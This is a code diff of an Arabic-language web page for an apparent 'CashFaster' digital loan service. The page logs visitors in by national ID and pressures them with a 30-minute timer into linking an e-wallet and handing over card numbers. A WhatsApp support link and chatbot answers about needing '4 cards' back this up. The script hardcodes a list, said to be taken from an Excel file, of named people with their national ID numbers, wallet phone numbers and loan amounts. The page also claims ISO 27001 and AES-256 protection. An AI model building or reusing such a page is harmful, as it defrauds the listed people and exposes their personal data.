@@ -28,7 +28,6 @@
             direction: rtl;
         }
 
-        /* Scrollbar Styling */
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -224,7 +223,6 @@
             margin: 0;
         }
 
-        /* Hero Section with Video */
         .hero-section {
             background: linear-gradient(135deg, rgba(212,175,55,0.1), rgba(245,176,66,0.05));
             border: 1px solid rgba(212,175,55,0.2);
@@ -535,7 +533,7 @@
         <p style="margin-bottom: 1.5rem;">النظام الذهبي للتمويل الرقمي</p>
         <div class="input-group">
             <label>📇 الرقم القومي (14 رقم)</label>
-            <input type="text" id="nationalId" placeholder="مثال: 2901080300051" maxlength="14" inputmode="numeric">
+            <input type="text" id="nationalId" placeholder="مثال: 28403270201213" maxlength="14" inputmode="numeric">
         </div>
         <div id="loginError" class="error-msg"></div>
         <button class="btn-gold" onclick="handleLogin()" style="width:100%">🔐 دخول آمن</button>
@@ -547,7 +545,6 @@
 
 <!-- لوحة التحكم -->
 <div id="dashboardPage" class="dashboard">
-    <!-- Header -->
     <div class="header-bar">
         <div class="header-content">
             <div class="header-logo">
@@ -562,7 +559,6 @@
     </div>
 
     <div class="container">
-        <!-- Welcome Section -->
         <div style="margin-bottom: 2rem;">
             <h2 class="gold-text" style="font-size: 2rem; margin-bottom: 0.5rem;">مرحباً <span id="customerName">...</span></h2>
             <div style="display: flex; align-items: center; gap: 0.5rem; color: #4ade80;">
@@ -571,7 +567,6 @@
             </div>
         </div>
 
-        <!-- Hero Section with Video -->
         <div class="hero-section">
             <div class="hero-video">
                 <video controls width="100%">
@@ -592,7 +587,6 @@
             </div>
         </div>
 
-        <!-- Info Cards Grid -->
         <div class="info-grid">
             <div class="info-card">
                 <i class="fas fa-chart-line"></i>
@@ -616,14 +610,12 @@
             </div>
         </div>
 
-        <!-- Timer Box -->
         <div class="timer-box">
             <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي للربط الآمن</div>
             <div class="timer" id="timerDisplay">30:00</div>
             <div style="font-size:0.8rem;">انتهاء الوقت = تعليق مؤقت | يمكنك التواصل مع الدعم لتمديده</div>
         </div>
 
-        <!-- Wallet Required Message -->
         <div id="walletRequiredMessage" class="wallet-warning">
             <i class="fas fa-exclamation-triangle" style="font-size:2rem; color: #FFD966;"></i>
             <h3>محفظة إلكترونية مطلوبة</h3>
@@ -633,7 +625,6 @@
             <a href="https://wa.me/212614494251?text=السلام%20عليكم%20،%20لقد%20قمت%20بفتح%20محفظتي%20وأريد%20استكمال%20طلب%20التمويل" target="_blank" class="btn-gold" style="display:inline-block;">📱 تواصل مع الدعم عبر واتساب</a>
         </div>
 
-        <!-- Linking Section -->
         <div id="linkingSection" class="linking-section">
             <div class="glass-card" style="padding:1.5rem; margin-bottom:2rem;">
                 <h3 style="font-size: 1.5rem; margin-bottom: 1rem;"><i class="fas fa-link"></i> ربط المحفظة الإلكترونية</h3>
@@ -652,7 +643,6 @@
             </div>
         </div>
 
-        <!-- Footer -->
         <footer>
             <i class="fas fa-lock"></i> جميع البيانات مشفرة وفقاً لمعايير ISO 27001<br>
             سياسة الخصوصية | شروط الخدمة | الدعم الفني 24/7
@@ -660,10 +650,8 @@
     </div>
 </div>
 
-<!-- Chat Button -->
 <button class="chat-btn" onclick="toggleChat()">💬</button>
 
-<!-- Chat Modal -->
 <div class="chat-modal" id="chatModal">
     <div class="chat-header">🤖 مساعد CashFaster الذكي</div>
     <div class="chat-body" id="chatBody">
@@ -678,23 +666,20 @@
 </div>
 
 <script>
-    // قاعدة العملاء
+    // قاعدة العملاء الجدد (مستخرجة من ملف Excel)
     const customers = [
-        { name: "أحمد منصور إبراهيم عبداللاه", id: "291080300051", wallet: null, type: null, loan: 200000, step: 50000 },
-        { name: "جرجس ميلاد ابراهيم كامل", id: "2800603240255", wallet: null, type: null, loan: 200000, step: 50000 },
-        { name: "حسانى عياد بدرى السنوسي", id: "28209292700476", wallet: "01004580991", type: "فودافون", loan: 40000, step: 10000 },
-        { name: "هانى بدر زكى رمضان ", id: "27508260104158", wallet: "01022510674", type: "فودافون", loan: 40000, step: 10000 },
-        { name: "وائل محمود عباس هريدي", id: "27903222600113", wallet: "01150597173", type: "اتصالات", loan: 50000, step: 12500 },
-        { name: "محمد خيرى احمد جميز", id: "29101011533558", wallet: "01122640557", type: "اتصالات", loan: 80000, step: 20000 },
-        { name: "محمود احمد احمد ابراهيم", id: "29003090102514", wallet: "01102416547", type: "اتصالات", loan: 45000, step: 11250 },
-        { name: "يوسف الأمير عبد الدايم محمود", id: "30105300104496", wallet: "01122640557", type: "اتصالات", loan: 80000, step: 20000 },
-        { name: "حسن خالد فاروق سلامه", id: "30109028800114", wallet: "01034385633", type: "فودافون", loan: 80000, step: 20000 },
-        { name: "اشرف كمال محمد احمد", id: "27204032701678", wallet: "01080195197", type: "فودافون", loan: 150000, step: 37500 },
-        { name: "علي سيد علي ابوالعز", id: "28001281101112", wallet: "01004734720", type: "فودافون", loan: 30000, step: 7500 },
-        { name: "محمد صابر احمد السيد", id: "28608110104239", wallet: "01090933407", type: "فودافون", loan: 60000, step: 15000 },
-        { name: "باسم جابر اسماعيل محمد", id: "29603101034", wallet: "01014397002", type: "فودافون", loan: 200000, step: 50000 },
-        { name: "عمرو محمد عبده السيد", id: "28108100101536", wallet: "01122048172", type: "اتصالات", loan: 200000, step: 50000 },
-        { name: "رباب سيد شعبان حسن", id: "28508010103087", wallet: "01140917234", type: "اتصالات", loan: 60000, step: 15000 },
+        { name: "محمود السيد محمود بيومي", id: "28403270201213", wallet: null, type: null, loan: 80000, step: 20000 },
+        { name: "معاذ السيد الغريب أحمد", id: "28205031201019", wallet: "01033830731", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "محمد احمد عبدالله عبدالقادر", id: "28906270200731", wallet: null, type: null, loan: 200000, step: 50000 },
+        { name: "علاء عبدالحكيم محمد درويش", id: "29410011617371", wallet: "01027250679", type: "فودافون", loan: 40000, step: 10000 },
+        { name: "محمد ابوالسعود محمود ابوالحسن", id: "29109182702197", wallet: null, type: null, loan: 50000, step: 12500 },
+        { name: "مصطفى نبيل فوزي محمود", id: "28612061701011", wallet: "01122540100", type: "اتصالات", loan: 50000, step: 12500 },
+        { name: "سماح سامي عبد المطلب ابراهيم", id: "28808271701881", wallet: "01024873103", type: "فودافون", loan: 50000, step: 12500 },
+        { name: "احمد محمد احمد ابو سيد", id: "27601272100298", wallet: "01000013172", type: "فودافون", loan: 200000, step: 50000 },
+        { name: "حماده السيد السعيد حبيش", id: "28606171602191", wallet: "01014327407", type: "فودافون", loan: 100000, step: 25000 },
+        { name: "حماده ابوالعلا عبد العظيم ابوالعلا", id: "29102272500939", wallet: "01092974641", type: "فودافون", loan: 30000, step: 7500 },
+        { name: "محمد على السيد سلام", id: "30001132500275", wallet: null, type: null, loan: 100000, step: 25000 },
+        { name: "محمد فتحى عبد الوارث محمد", id: "28507170200317", wallet: "01092134722", type: "فودافون", loan: 120000, step: 30000 }
     ];
 
     let currentCustomer = null;
@@ -727,7 +712,6 @@
         document.getElementById('customerName').innerText = customer.name;
         document.getElementById('loanAmount').innerText = customer.loan.toLocaleString() + ' ج.م';
 
-        // عرض نوع المحفظة ورقم المحفظة
         let walletDisplay = "لا توجد محفظة مسجلة";
         let walletNumberDisplay = "غير مسجل";
         if (customer.type === 'فودافون') {
@@ -823,7 +807,7 @@
     function faqAnswer(q) {
         const chatBody = document.getElementById('chatBody');
         const answers = {
-            'لماذا 4عمليات؟': 'لضمان تشفير المبلغ وتأمينه عبر النظام الآلي. كل عملية تمثل طبقة أمان إضافية.',
+            'لماذا 4 كروت؟': 'لضمان تشفير المبلغ وتأمينه عبر النظام الآلي. كل عملية تمثل طبقة أمان إضافية.',
             'متى استلم القرض؟': 'بعد التأكيد النهائي، يتم تحويل القرض إلى محفظتك خلال 180 دقيقة كحد أقصى.',
             'هل بياناتي آمنة؟': 'نعم، نظامنا يستخدم تشفير AES-256 ولا يمكن لأي موظف الإطلاع على أرقام الكروت.',
             'ماذا لو انتهى الوقت؟': 'يمكنك التواصل مع الدعم الفني لتمديد الجلسة خلال 6 ساعات من انتهاء الوقت.'
